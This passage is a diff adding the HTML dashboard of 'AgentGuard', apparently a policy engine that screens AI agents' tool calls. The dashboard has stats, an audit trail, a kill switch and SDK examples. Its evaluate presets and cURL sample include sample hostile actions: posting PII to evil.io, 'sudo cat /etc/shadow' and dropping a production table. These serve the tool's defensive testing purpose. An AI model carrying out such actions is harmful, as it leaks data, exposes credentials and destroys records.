@@ -1,0 +1,1087 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>AgentGuard — Dashboard</title>
+<!-- Favicon: shield emoji SVG data URI -->
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🛡</text></svg>">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<style>
+*, *::before, *::after { margin:0; padding:0; box-sizing:border-box; }
+:root {
+  --bg:#0a0a1a; --bg-card:#111128; --bg-card2:#13132e; --bg-sidebar:#0c0c20;
+  /* Darkened accent from #6366f1 to #5254d4 for WCAG AA contrast on white text */
+  --accent:#5254d4; --accent-dim:rgba(82,84,212,0.12); --accent-hi:#818cf8;
+  --green:#22c55e; --red:#ef4444; --amber:#f59e0b; --blue:#3b82f6;
+  --text:#e2e8f0; --text-dim:#94a3b8; --text-bright:#f8fafc;
+  --border:rgba(99,102,241,0.18); --border-dim:rgba(255,255,255,0.06);
+  --radius:10px; --mono:'JetBrains Mono',monospace; --sans:'Inter',sans-serif;
+}
+body { font-family:var(--sans); background:var(--bg); color:var(--text); line-height:1.5; overflow-x:hidden; }
+a { color:var(--accent-hi); text-decoration:none; }
+
+/* ── LAYOUT ────────────────────────────────────────── */
+.app { display:grid; grid-template-columns:240px 1fr; min-height:100vh; }
+.sidebar { background:var(--bg-sidebar); border-right:1px solid var(--border-dim); padding:24px 16px; display:flex; flex-direction:column; gap:4px; position:sticky; top:0; height:100vh; overflow-y:auto; }
+.sidebar-logo { display:flex; align-items:center; gap:10px; padding:8px 12px; margin-bottom:24px; font-weight:700; font-size:1.05rem; color:var(--text-bright); }
+.sidebar-logo span { font-size:1.3rem; }
+.nav-item { display:flex; align-items:center; gap:10px; padding:10px 14px; border-radius:8px; color:var(--text-dim); font-size:0.88rem; font-weight:500; cursor:pointer; transition:all 0.15s; border:none; background:none; width:100%; text-align:left; font-family:inherit; }
+.nav-item:hover { color:var(--text); background:var(--accent-dim); }
+.nav-item.active { color:var(--accent-hi); background:var(--accent-dim); font-weight:600; }
+.nav-section { font-size:0.72rem; font-weight:600; text-transform:uppercase; letter-spacing:0.08em; color:var(--text-dim); padding:20px 14px 6px; }
+.main { padding:28px 32px; overflow-y:auto; }
+.main-header { display:flex; align-items:center; justify-content:space-between; margin-bottom:28px; }
+.main-header h1 { font-size:1.5rem; font-weight:700; color:var(--text-bright); }
+
+/* ── MOBILE HEADER ─────────────────────────────────── */
+.mobile-header {
+  display:none; align-items:center; justify-content:space-between;
+  padding:12px 16px; background:var(--bg-sidebar); border-bottom:1px solid var(--border-dim);
+  position:sticky; top:0; z-index:200;
+}
+.mobile-header .mobile-logo { display:flex; align-items:center; gap:8px; font-weight:700; font-size:1rem; color:var(--text-bright); }
+.hamburger { background:none; border:none; cursor:pointer; padding:6px; color:var(--text-dim); font-size:1.4rem; line-height:1; }
+.mobile-nav-overlay {
+  display:none; position:fixed; inset:0; background:rgba(0,0,0,0.7); z-index:150; backdrop-filter:blur(4px);
+}
+.mobile-nav-overlay.open { display:block; }
+.mobile-nav-drawer {
+  position:fixed; top:0; left:0; bottom:0; width:260px; background:var(--bg-sidebar);
+  z-index:160; padding:24px 16px; display:flex; flex-direction:column; gap:4px;
+  transform:translateX(-100%); transition:transform 0.25s ease;
+}
+.mobile-nav-drawer.open { transform:translateX(0); }
+.mobile-nav-close { background:none; border:none; cursor:pointer; color:var(--text-dim); font-size:1.2rem; padding:4px; margin-bottom:16px; align-self:flex-end; }
+
+/* ── CARDS ──────────────────────────────────────────── */
+.stats-grid { display:grid; grid-template-columns:repeat(4,1fr); gap:16px; margin-bottom:28px; }
+.stat-card { background:var(--bg-card); border:1px solid var(--border-dim); border-radius:var(--radius); padding:20px; }
+.stat-card .label { font-size:0.78rem; color:var(--text-dim); font-weight:600; text-transform:uppercase; letter-spacing:0.04em; margin-bottom:8px; }
+.stat-card .value { font-size:2rem; font-weight:700; color:var(--text-bright); font-family:var(--mono); }
+.stat-card .sub { font-size:0.78rem; color:var(--text-dim); margin-top:4px; }
+
+.card { background:var(--bg-card); border:1px solid var(--border-dim); border-radius:var(--radius); overflow:hidden; margin-bottom:20px; }
+.card-header { padding:16px 20px; border-bottom:1px solid var(--border-dim); display:flex; align-items:center; justify-content:space-between; }
+.card-header h2 { font-size:0.95rem; font-weight:600; color:var(--text-bright); }
+.card-body { padding:20px; }
+.card-body.no-pad { padding:0; }
+
+/* ── TABLE ──────────────────────────────────────────── */
+table { width:100%; border-collapse:collapse; font-size:0.85rem; }
+th { text-align:left; padding:10px 16px; font-weight:600; font-size:0.75rem; text-transform:uppercase; letter-spacing:0.04em; color:var(--text-dim); border-bottom:1px solid var(--border-dim); background:var(--bg-card2); }
+td { padding:12px 16px; border-bottom:1px solid var(--border-dim); }
+tr:hover td { background:rgba(99,102,241,0.04); }
+
+/* ── BADGES ─────────────────────────────────────────── */
+.badge { display:inline-block; padding:3px 10px; border-radius:20px; font-size:0.75rem; font-weight:600; font-family:var(--mono); }
+.badge-allow { background:rgba(34,197,94,0.12); color:var(--green); }
+.badge-block { background:rgba(239,68,68,0.12); color:var(--red); }
+.badge-monitor { background:rgba(99,102,241,0.12); color:var(--accent-hi); }
+.badge-require_approval { background:rgba(245,158,11,0.12); color:var(--amber); }
+.badge-critical { background:rgba(239,68,68,0.12); color:var(--red); }
+.badge-high { background:rgba(245,158,11,0.12); color:var(--amber); }
+.badge-medium { background:rgba(99,102,241,0.12); color:var(--accent-hi); }
+.badge-low { background:rgba(34,197,94,0.12); color:var(--green); }
+
+/* ── BUTTONS ────────────────────────────────────────── */
+.btn { padding:8px 18px; border:none; border-radius:8px; font-weight:600; font-size:0.85rem; cursor:pointer; transition:all 0.15s; font-family:inherit; }
+/* WCAG AA: #5254d4 on white = ~5.1:1 contrast */
+.btn-primary { background:var(--accent); color:white; }
+.btn-primary:hover { background:#4042b0; }
+.btn-ghost { background:transparent; border:1px solid var(--border); color:var(--text-dim); }
+.btn-ghost:hover { border-color:var(--accent); color:var(--text); }
+.btn-danger { background:rgba(239,68,68,0.12); color:var(--red); border:1px solid rgba(239,68,68,0.2); }
+.btn-danger:hover { background:rgba(239,68,68,0.2); }
+
+/* ── FORM ───────────────────────────────────────────── */
+.form-group { margin-bottom:16px; }
+.form-group label { display:block; font-size:0.78rem; font-weight:600; color:var(--text-dim); margin-bottom:6px; text-transform:uppercase; letter-spacing:0.04em; }
+.form-group input, .form-group select, .form-group textarea {
+  width:100%; padding:10px 14px; background:var(--bg-card2); border:1px solid var(--border); border-radius:8px;
+  color:var(--text-bright); font-family:var(--mono); font-size:0.85rem; outline:none; transition:border-color 0.15s;
+}
+.form-group input:focus, .form-group textarea:focus { border-color:var(--accent); }
+.form-group textarea { min-height:120px; resize:vertical; line-height:1.6; }
+
+/* ── PAGES (hide/show) ─────────────────────────────── */
+.page { display:none; }
+.page.active { display:block; }
+
+/* ── LIVE FEED ──────────────────────────────────────── */
+.feed-item { display:flex; align-items:flex-start; gap:12px; padding:12px 16px; border-bottom:1px solid var(--border-dim); transition:background 0.15s; }
+.feed-item:hover { background:rgba(99,102,241,0.04); }
+.feed-dot { width:10px; height:10px; border-radius:50%; margin-top:5px; flex-shrink:0; }
+.feed-time { font-family:var(--mono); font-size:0.75rem; color:var(--text-dim); min-width:70px; }
+.feed-content { flex:1; }
+.feed-tool { font-family:var(--mono); font-size:0.85rem; color:var(--text-bright); }
+.feed-rule { font-size:0.78rem; color:var(--text-dim); margin-top:2px; }
+.feed-new { animation:feedIn 0.3s ease-out; }
+@keyframes feedIn { from { opacity:0; transform:translateY(-8px); } to { opacity:1; transform:none; } }
+
+/* ── POLICY EDITOR ──────────────────────────────────── */
+.policy-rule { padding:16px; border-bottom:1px solid var(--border-dim); display:flex; align-items:center; gap:16px; }
+.policy-rule:last-child { border-bottom:none; }
+.policy-rule .rule-id { font-family:var(--mono); font-size:0.85rem; color:var(--text-bright); font-weight:600; min-width:200px; }
+.policy-rule .rule-desc { flex:1; font-size:0.85rem; color:var(--text-dim); }
+
+/* ── KILL SWITCH ────────────────────────────────────── */
+.kill-switch-panel { text-align:center; padding:48px 24px; }
+.kill-btn { width:200px; height:200px; border-radius:50%; border:4px solid var(--red); background:rgba(239,68,68,0.08); color:var(--red); font-size:1.2rem; font-weight:700; cursor:pointer; transition:all 0.2s; font-family:inherit; }
+.kill-btn:hover { background:rgba(239,68,68,0.2); transform:scale(1.05); }
+.kill-btn.active { background:var(--red); color:white; animation:pulse-kill 1.5s infinite; }
+@keyframes pulse-kill { 0%,100% { box-shadow:0 0 0 0 rgba(239,68,68,0.4); } 50% { box-shadow:0 0 0 20px rgba(239,68,68,0); } }
+
+/* ── COLD START BANNER ──────────────────────────────── */
+.cold-start-banner {
+  display:none; align-items:center; gap:10px; padding:12px 16px;
+  background:rgba(245,158,11,0.12); border:1px solid rgba(245,158,11,0.3);
+  border-radius:8px; margin-bottom:20px; font-size:0.85rem;
+}
+.cold-start-banner.visible { display:flex; }
+
+/* ── RESPONSIVE ─────────────────────────────────────── */
+@media (max-width:900px) {
+  .app { grid-template-columns:1fr; }
+  .sidebar { display:none; }
+  .stats-grid { grid-template-columns:repeat(2,1fr); }
+  .mobile-header { display:flex; }
+  .main { padding:20px 16px; }
+}
+</style>
+</head>
+<body>
+
+<!-- Mobile Header (visible on small screens) -->
+<div class="mobile-header">
+  <div class="mobile-logo"><span>🛡</span> AgentGuard</div>
+  <button class="hamburger" onclick="openMobileNav()" aria-label="Open navigation menu">☰</button>
+</div>
+
+<!-- Mobile Nav Overlay -->
+<div class="mobile-nav-overlay" id="mobile-nav-overlay" onclick="closeMobileNav()"></div>
+<div class="mobile-nav-drawer" id="mobile-nav-drawer" role="navigation" aria-label="Mobile navigation">
+  <button class="mobile-nav-close" onclick="closeMobileNav()" aria-label="Close navigation">✕</button>
+  <div class="sidebar-logo"><span>🛡</span> AgentGuard</div>
+  <button class="nav-item" onclick="showPage('overview', event)">📊 Overview</button>
+  <button class="nav-item" onclick="showPage('live', event)">⚡ Live Feed</button>
+  <button class="nav-item" onclick="showPage('evaluate', event)">🔍 Evaluate</button>
+  <div class="nav-section">Configuration</div>
+  <button class="nav-item" onclick="showPage('policy', event)">📜 Policies</button>
+  <button class="nav-item" onclick="showPage('audit', event)">📋 Audit Trail</button>
+  <button class="nav-item" onclick="showPage('killswitch', event)">🔴 Kill Switch</button>
+  <div class="nav-section">Integrate</div>
+  <button class="nav-item" onclick="showPage('sdk', event)">🔧 SDK / API</button>
+</div>
+
+<a href="#main-content" style="position:absolute;left:-9999px;top:0;z-index:9999;padding:8px 16px;background:var(--accent);color:white;font-weight:600" onfocus="this.style.left='8px'" onblur="this.style.left='-9999px'">Skip to content</a>
+<div class="app">
+  <!-- Desktop Sidebar -->
+  <nav class="sidebar" aria-label="Main navigation">
+    <div class="sidebar-logo"><span>🛡</span> AgentGuard</div>
+    <button class="nav-item active" onclick="showPage('overview', event)">📊 Overview</button>
+    <button class="nav-item" onclick="showPage('live', event)">⚡ Live Feed</button>
+    <button class="nav-item" onclick="showPage('evaluate', event)">🔍 Evaluate</button>
+    <div class="nav-section">Configuration</div>
+    <button class="nav-item" onclick="showPage('policy', event)">📜 Policies</button>
+    <button class="nav-item" onclick="showPage('audit', event)">📋 Audit Trail</button>
+    <button class="nav-item" onclick="showPage('killswitch', event)">🔴 Kill Switch</button>
+    <div class="nav-section">Integrate</div>
+    <button class="nav-item" onclick="showPage('sdk', event)">🔧 SDK / API</button>
+    <div style="flex:1"></div>
+    <div style="padding:12px;border-top:1px solid var(--border-dim);font-size:0.78rem;color:var(--text-dim)">
+      <div style="font-weight:600;color:var(--accent-hi)">AgentGuard v0.1.0</div>
+      Engine: 7 rules loaded<br>
+      Default: allow
+    </div>
+  </nav>
+
+  <!-- Main Content -->
+  <main class="main" id="main-content" role="main">
+
+    <!-- Cold-start warning banner -->
+    <div class="cold-start-banner" id="cold-start-banner" role="alert" aria-live="polite">
+      <span>⏳</span>
+      <span><strong>API warming up.</strong> The API scales to zero between requests. It may take 10–15 seconds to respond on first load.</span>
+    </div>
+
+    <!-- API Key input -->
+    <div style="margin-bottom:16px;padding:12px 16px;background:var(--bg-card);border:1px solid var(--border-dim);border-radius:8px;display:flex;align-items:center;gap:12px;flex-wrap:wrap">
+      <label for="api-key-input" style="font-size:0.78rem;font-weight:600;color:var(--text-dim);text-transform:uppercase;letter-spacing:0.04em">API Key</label>
+      <input type="text" id="api-key-input" placeholder="ag_live_xxx" style="flex:1;min-width:200px;padding:8px 12px;background:var(--bg-card2);border:1px solid var(--border);border-radius:6px;color:var(--text-bright);font-family:var(--mono);font-size:0.82rem;outline:none" onchange="saveApiKey(this.value)">
+      <span style="font-size:0.75rem;color:var(--text-dim)">Press Enter to save</span>
+    </div>
+
+    <!-- ── OVERVIEW PAGE ──────────────────────────────── -->
+    <div class="page active" id="page-overview" role="main">
+      <div class="main-header">
+        <h1>Dashboard</h1>
+        <div style="display:flex;gap:8px">
+          <span id="api-status" style="display:flex;align-items:center;gap:6px;font-size:0.82rem;color:var(--text-dim)" aria-live="polite">
+            <span id="api-dot" style="width:8px;height:8px;border-radius:50%;background:var(--text-dim)"></span> Checking API...
+          </span>
+        </div>
+      </div>
+
+      <div class="stats-grid">
+        <div class="stat-card">
+          <div class="label">Total Evaluations</div>
+          <div class="value" id="stat-total">0</div>
+          <div class="sub">this session</div>
+        </div>
+        <div class="stat-card">
+          <div class="label">Allowed</div>
+          <div class="value" style="color:var(--green)" id="stat-allowed">0</div>
+          <div class="sub" id="stat-allow-pct">—</div>
+        </div>
+        <div class="stat-card">
+          <div class="label">Blocked</div>
+          <div class="value" style="color:var(--red)" id="stat-blocked">0</div>
+          <div class="sub" id="stat-block-pct">—</div>
+        </div>
+        <div class="stat-card">
+          <div class="label">Avg Latency</div>
+          <div class="value" id="stat-latency">—</div>
+          <div class="sub">engine eval time</div>
+        </div>
+      </div>
+
+      <div class="card">
+        <div class="card-header">
+          <h2>Recent Activity</h2>
+          <button class="btn btn-ghost" onclick="showPage('live', event)">View Live Feed →</button>
+        </div>
+        <div class="card-body no-pad" id="recent-feed" style="max-height:320px;overflow-y:auto" aria-live="polite">
+          <div style="padding:24px;text-align:center;color:var(--text-dim)">No evaluations yet. Try the Evaluate page to test the policy engine.</div>
+        </div>
+      </div>
+
+      <div style="display:grid;grid-template-columns:1fr 1fr;gap:20px">
+        <div class="card">
+          <div class="card-header"><h2>Active Policy</h2></div>
+          <div class="card-body" id="overview-policy">Loading...</div>
+        </div>
+        <div class="card">
+          <div class="card-header"><h2>Quick Actions</h2></div>
+          <div class="card-body" style="display:flex;flex-direction:column;gap:10px">
+            <button class="btn btn-primary" onclick="showPage('evaluate', event)" style="width:100%">🔍 Evaluate an Agent Action</button>
+            <button class="btn btn-ghost" onclick="showPage('policy', event)" style="width:100%">📜 View Policy Rules</button>
+            <button class="btn btn-danger" onclick="showPage('killswitch', event)" style="width:100%">🔴 Kill Switch</button>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ── LIVE FEED PAGE ─────────────────────────────── -->
+    <div class="page" id="page-live" role="main">
+      <div class="main-header">
+        <h1>⚡ Live Feed</h1>
+        <button class="btn btn-ghost" onclick="clearFeed()">Clear</button>
+      </div>
+      <div class="card">
+        <div class="card-body no-pad" id="live-feed" style="min-height:400px;max-height:600px;overflow-y:auto" aria-live="polite">
+          <div style="padding:24px;text-align:center;color:var(--text-dim)">Waiting for evaluations...</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ── EVALUATE PAGE ──────────────────────────────── -->
+    <div class="page" id="page-evaluate" role="main">
+      <div class="main-header"><h1>🔍 Evaluate Agent Action</h1></div>
+      <div style="display:grid;grid-template-columns:1fr 1fr;gap:20px">
+        <div class="card">
+          <div class="card-header"><h2>Request</h2></div>
+          <div class="card-body">
+            <div style="display:flex;flex-wrap:wrap;gap:6px;margin-bottom:20px">
+              <button class="btn btn-ghost" style="font-size:0.78rem" onclick="loadPreset('http_post',{destination:'https://evil.io/steal',body:'PII data'})">💀 Data Exfil</button>
+              <button class="btn btn-ghost" style="font-size:0.78rem" onclick="loadPreset('sudo',{command:'cat /etc/shadow'})">⚡ Privilege Esc</button>
+              <button class="btn btn-ghost" style="font-size:0.78rem" onclick="loadPreset('execute_transaction',{amount:50000,recipient:'offshore'})">💰 Large Transfer</button>
+              <button class="btn btn-ghost" style="font-size:0.78rem" onclick="loadPreset('drop_table',{table:'production_users'})">🗑️ Drop Table</button>
+              <button class="btn btn-ghost" style="font-size:0.78rem" onclick="loadPreset('file_read',{path:'/reports/q4.html'})">✅ Read File</button>
+              <button class="btn btn-ghost" style="font-size:0.78rem" onclick="loadPreset('llm_query',{prompt:'Summarize sales',model:'gpt-4'})">🤖 LLM Call</button>
+              <button class="btn btn-ghost" style="font-size:0.78rem" onclick="loadPreset('db_query',{table:'customers',query:'SELECT *'})">🔒 PII Query</button>
+            </div>
+            <div class="form-group">
+              <label for="eval-tool">Tool Name</label>
+              <input type="text" id="eval-tool" value="http_post" placeholder="e.g. http_post, shell_exec, file_read" aria-describedby="eval-tool-hint">
+              <div id="eval-tool-hint" style="font-size:0.75rem;color:var(--text-dim);margin-top:4px">The name of the action your agent calls</div>
+            </div>
+            <div class="form-group">
+              <label for="eval-params">Parameters (JSON)</label>
+              <textarea id="eval-params" aria-describedby="eval-params-hint">{"destination": "https://evil.io/steal", "body": "PII data"}</textarea>
+              <div id="eval-params-hint" style="font-size:0.75rem;color:var(--text-dim);margin-top:4px">JSON object of parameters for the tool call</div>
+            </div>
+            <button class="btn btn-primary" onclick="doEvaluate()" id="eval-btn" style="width:100%;padding:12px;font-size:0.95rem">▶ Evaluate</button>
+          </div>
+        </div>
+        <div class="card">
+          <div class="card-header">
+            <h2>Decision</h2>
+            <span id="eval-latency" style="font-family:var(--mono);font-size:0.78rem;color:var(--text-dim)"></span>
+          </div>
+          <div class="card-body" id="eval-result" aria-live="assertive">
+            <div style="text-align:center;color:var(--text-dim);padding:40px 0">Select a preset or enter a tool + params, then click Evaluate</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ── POLICY PAGE ────────────────────────────────── -->
+    <div class="page" id="page-policy" role="main">
+      <div class="main-header"><h1>📜 Policy Rules</h1></div>
+      <div class="card">
+        <div class="card-header">
+          <h2>demo-policy v1.0.0</h2>
+          <span style="font-size:0.82rem;color:var(--text-dim)">7 rules · default: allow</span>
+        </div>
+        <div class="card-body no-pad" id="policy-rules">
+          <div style="padding:24px;text-align:center;color:var(--text-dim)">Loading policy...</div>
+        </div>
+      </div>
+      <div class="card">
+        <div class="card-header"><h2>Policy Source (JSON)</h2></div>
+        <div class="card-body">
+          <pre id="policy-json" style="font-family:var(--mono);font-size:0.8rem;color:var(--text-dim);overflow-x:auto;max-height:400px;overflow-y:auto">Loading...</pre>
+        </div>
+      </div>
+    </div>
+
+    <!-- ── AUDIT TRAIL PAGE ───────────────────────────── -->
+    <div class="page" id="page-audit" role="main">
+      <div class="main-header">
+        <h1>📋 Audit Trail</h1>
+        <div style="display:flex;gap:8px;align-items:center">
+          <button class="btn btn-ghost" onclick="verifyIntegrity()" id="verify-btn">🔒 Verify Integrity</button>
+          <span style="font-size:0.82rem;color:var(--text-dim)">Hash-chained · Tamper-evident · <span id="audit-count">0</span> events</span>
+        </div>
+      </div>
+      <div id="verify-result" style="display:none;margin-bottom:16px;padding:12px 16px;background:rgba(34,197,94,0.08);border:1px solid rgba(34,197,94,0.25);border-radius:8px;font-size:0.85rem"></div>
+      <div class="card">
+        <div class="card-body no-pad">
+          <table>
+            <thead><tr><th>#</th><th>Time</th><th>Tool</th><th>Decision</th><th>Rule</th><th>Risk</th><th>Latency</th><th>Hash</th></tr></thead>
+            <tbody id="audit-tbody">
+              <tr><td colspan="8" style="text-align:center;color:var(--text-dim);padding:24px">Loading audit data...</td></tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+    </div>
+
+    <!-- ── KILL SWITCH PAGE ───────────────────────────── -->
+    <div class="page" id="page-killswitch" role="main">
+      <div class="main-header"><h1>🔴 Kill Switch</h1></div>
+      <div class="card">
+        <div class="card-body">
+          <div class="kill-switch-panel">
+            <p style="color:var(--text-dim);margin-bottom:24px;max-width:500px;margin-left:auto;margin-right:auto">
+              Emergency halt for all agent operations. When activated, every evaluation returns <span class="badge badge-block">BLOCK</span> regardless of policy rules. This calls the real API — all clients are affected.
+            </p>
+            <div id="kill-api-status" style="font-size:0.8rem;color:var(--text-dim);margin-bottom:16px" aria-live="polite"></div>
+            <button class="kill-btn" id="kill-btn" onclick="toggleKillSwitch()" aria-label="Toggle kill switch">
+              KILL<br>SWITCH
+            </button>
+            <p style="color:var(--text-dim);margin-top:24px;font-size:0.85rem" id="kill-status" aria-live="assertive">Status: <span style="color:var(--green)">Inactive</span></p>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ── SDK PAGE ───────────────────────────────────── -->
+    <div class="page" id="page-sdk" role="main">
+      <div class="main-header"><h1>🔧 SDK &amp; API Reference</h1></div>
+      <div class="card">
+        <div class="card-header"><h2>API Endpoint</h2></div>
+        <div class="card-body">
+          <code style="display:block;background:var(--bg-card2);padding:12px 16px;border-radius:8px;font-family:var(--mono);font-size:0.9rem;color:var(--accent-hi);margin-bottom:12px">POST https://api.agentguard.tech/api/v1/evaluate</code>
+          <p style="color:var(--text-dim);font-size:0.85rem">Send any agent action to this endpoint to get a real-time policy decision.</p>
+        </div>
+      </div>
+      <div style="display:grid;grid-template-columns:1fr 1fr;gap:20px">
+        <div class="card">
+          <div class="card-header"><h2>cURL</h2></div>
+          <div class="card-body">
+            <pre style="font-family:var(--mono);font-size:0.8rem;color:var(--text);line-height:1.7;overflow-x:auto">curl -X POST https://api.agentguard.tech/api/v1/evaluate \
+  -H "Content-Type: application/json" \
+  -d '{
+    "tool": "http_post",
+    "params": {
+      "destination": "https://evil.io"
+    }
+  }'</pre>
+          </div>
+        </div>
+        <div class="card">
+          <div class="card-header"><h2>Python</h2></div>
+          <div class="card-body">
+            <pre style="font-family:var(--mono);font-size:0.8rem;color:var(--text);line-height:1.7;overflow-x:auto">import requests
+
+r = requests.post(
+    "https://api.agentguard.tech/api/v1/evaluate",
+    json={
+        "tool": "http_post",
+        "params": {"destination": url}
+    }
+)
+decision = r.json()
+if decision["result"] == "block":
+    raise PolicyViolation(decision["reason"])</pre>
+          </div>
+        </div>
+        <div class="card">
+          <div class="card-header"><h2>TypeScript</h2></div>
+          <div class="card-body">
+            <pre style="font-family:var(--mono);font-size:0.8rem;color:var(--text);line-height:1.7;overflow-x:auto">const res = await fetch(
+  "https://api.agentguard.tech/api/v1/evaluate",
+  {
+    method: "POST",
+    headers: {"Content-Type": "application/json"},
+    body: JSON.stringify({
+      tool: "http_post",
+      params: { destination: url }
+    })
+  }
+);
+const { result, riskScore } = await res.json();</pre>
+          </div>
+        </div>
+        <div class="card">
+          <div class="card-header"><h2>Response Format</h2></div>
+          <div class="card-body">
+            <pre style="font-family:var(--mono);font-size:0.8rem;color:var(--text);line-height:1.7;overflow-x:auto">{
+  "result": "block",          // allow | block | monitor | require_approval
+  "matchedRuleId": "block-external-http",
+  "riskScore": 75,            // 0-1000
+  "reason": "Blocked by rule...",
+  "durationMs": 0.49          // sub-millisecond
+}</pre>
+          </div>
+        </div>
+      </div>
+    </div>
+
+  </main><!-- /main -->
+</div><!-- /app -->
+
+<script>
+// ── Config ──────────────────────────────────────────────
+// Primary: custom domain. Fallback: direct Azure URL.
+const API_PRIMARY = 'https://api.agentguard.tech';
+const API_FALLBACK = 'https://agentguard-api.greenrock-adeab1b0.australiaeast.azurecontainerapps.io';
+let API = API_FALLBACK; // Start with fallback; update after health check
+
+let sessionId = null;
+let allEvents = [];
+let killActive = false;
+let totalLatency = 0;
+let evalCount = 0;
+let storedApiKey = null;
+
+// ── API Key Management ─────────────────────────────────
+function saveApiKey(key) {
+  storedApiKey = key.trim();
+  if (storedApiKey) {
+    try { localStorage.setItem('ag_dashboard_api_key', storedApiKey); } catch {}
+    document.getElementById('api-key-input').value = storedApiKey;
+  }
+  loadApiKey();
+}
+
+function loadApiKey() {
+  try {
+    var saved = localStorage.getItem('ag_dashboard_api_key');
+    if (saved) {
+      storedApiKey = saved;
+      document.getElementById('api-key-input').value = saved;
+    }
+  } catch {}
+  // Also check for key from landing page signup
+  try {
+    var landingKey = localStorage.getItem('ag_api_key');
+    if (landingKey && !storedApiKey) {
+      storedApiKey = landingKey;
+      document.getElementById('api-key-input').value = landingKey;
+    }
+  } catch {}
+}
+
+function getApiHeaders() {
+  var headers = { 'Content-Type': 'application/json' };
+  if (storedApiKey) {
+    headers['X-API-Key'] = storedApiKey;
+  }
+  return headers;
+}
+
+// ── Load Usage Stats from API ───────────────────────────
+async function loadUsageStats() {
+  if (!storedApiKey) return; // Need API key for real data
+  
+  for (var i = 0; i < 2; i++) {
+    var baseUrl = i === 0 ? API_PRIMARY : API_FALLBACK;
+    try {
+      var r = await fetch(baseUrl + '/api/v1/usage', {
+        headers: getApiHeaders(),
+        signal: AbortSignal.timeout(10000)
+      });
+      if (r.ok) {
+        var data = await r.json();
+        // Update stats
+        document.getElementById('stat-total').textContent = data.totalEvaluations || 0;
+        document.getElementById('stat-allowed').textContent = data.allowed || 0;
+        document.getElementById('stat-blocked').textContent = data.blocked || 0;
+        var total = data.totalEvaluations || 1;
+        document.getElementById('stat-allow-pct').textContent = Math.round(data.allowed / total * 100) + '%';
+        document.getElementById('stat-block-pct').textContent = Math.round(data.blocked / total * 100) + '%';
+        document.getElementById('stat-latency').textContent = (data.avgLatencyMs || 0) + 'ms';
+        return;
+      }
+    } catch {}
+  }
+}
+
+// ── Load Audit Trail from API ──────────────────────────
+async function loadAuditTrail() {
+  if (!storedApiKey) return;
+  
+  for (var i = 0; i < 2; i++) {
+    var baseUrl = i === 0 ? API_PRIMARY : API_FALLBACK;
+    try {
+      var r = await fetch(baseUrl + '/api/v1/audit', {
+        headers: getApiHeaders(),
+        signal: AbortSignal.timeout(10000)
+      });
+      if (r.ok) {
+        var data = await r.json();
+        var events = data.events || [];
+        document.getElementById('audit-count').textContent = events.length;
+        
+        var tbody = document.getElementById('audit-tbody');
+        if (events.length === 0) {
+          tbody.innerHTML = '<tr><td colspan="8" style="text-align:center;color:var(--text-dim);padding:24px">No audit events yet</td></tr>';
+          return;
+        }
+        
+        tbody.innerHTML = events.map(function(e, idx) {
+          var badgeClass = e.decision === 'allow' ? 'badge-allow' : e.decision === 'block' ? 'badge-block' : 'badge-monitor';
+          return '<tr>' +
+            '<td style="font-family:var(--mono);font-size:0.82rem">' + (idx + 1) + '</td>' +
+            '<td style="font-family:var(--mono);font-size:0.82rem;color:var(--text-dim)">' + (e.timestamp || '').replace('T', ' ').slice(0, 19) + '</td>' +
+            '<td style="font-family:var(--mono);font-size:0.82rem">' + esc(e.tool || '') + '</td>' +
+            '<td><span class="badge ' + badgeClass + '">' + esc(e.decision || '') + '</span></td>' +
+            '<td style="font-family:var(--mono);font-size:0.82rem;color:var(--text-dim)">' + esc(e.matchedRuleId || '—') + '</td>' +
+            '<td style="font-family:var(--mono);font-size:0.82rem;color:' + ((e.riskScore || 0) > 50 ? 'var(--red)' : 'var(--green)') + '">' + (e.riskScore || 0) + '</td>' +
+            '<td style="font-family:var(--mono);font-size:0.82rem;color:var(--accent-hi)">' + (e.durationMs || 0) + 'ms</td>' +
+            '<td style="font-family:var(--mono);font-size:0.75rem;color:var(--text-dim)">' + (e.hash || '—') + '</td>' +
+            '</tr>';
+        }).join('');
+        return;
+      }
+    } catch {}
+  }
+}
+
+// ── Verify Integrity ───────────────────────────────────
+async function verifyIntegrity() {
+  if (!storedApiKey) {
+    alert('Please enter your API key first');
+    return;
+  }
+  
+  var btn = document.getElementById('verify-btn');
+  btn.disabled = true;
+  btn.textContent = 'Verifying...';
+  
+  var resultEl = document.getElementById('verify-result');
+  resultEl.style.display = 'none';
+  
+  for (var i = 0; i < 2; i++) {
+    var baseUrl = i === 0 ? API_PRIMARY : API_FALLBACK;
+    try {
+      var r = await fetch(baseUrl + '/api/v1/audit/verify', {
+        headers: getApiHeaders(),
+        signal: AbortSignal.timeout(15000)
+      });
+      if (r.ok) {
+        var data = await r.json();
+        resultEl.style.display = 'block';
+        if (data.valid) {
+          resultEl.style.background = 'rgba(34,197,94,0.08)';
+          resultEl.style.borderColor = 'rgba(34,197,94,0.25)';
+          resultEl.innerHTML = '✓ <strong>Audit trail integrity verified</strong> — ' + data.message + ' (' + data.eventsVerified + ' events verified)';
+        } else {
+          resultEl.style.background = 'rgba(239,68,68,0.08)';
+          resultEl.style.borderColor = 'rgba(239,68,68,0.25)';
+          resultEl.innerHTML = '✕ <strong>Integrity check failed</strong> — ' + data.message;
+        }
+        btn.disabled = false;
+        btn.textContent = '🔒 Verify Integrity';
+        return;
+      }
+    } catch {}
+  }
+  
+  resultEl.style.display = 'block';
+  resultEl.style.background = 'rgba(245,158,11,0.08)';
+  resultEl.style.borderColor = 'rgba(245,158,11,0.25)';
+  resultEl.innerHTML = '⚠ Could not verify integrity — API may be unavailable';
+  btn.disabled = false;
+  btn.textContent = '🔒 Verify Integrity';
+}
+
+// ── XSS Escape Helper ───────────────────────────────────
+function esc(str) {
+  return String(str)
+    .replace(/&/g, '&amp;')
+    .replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;')
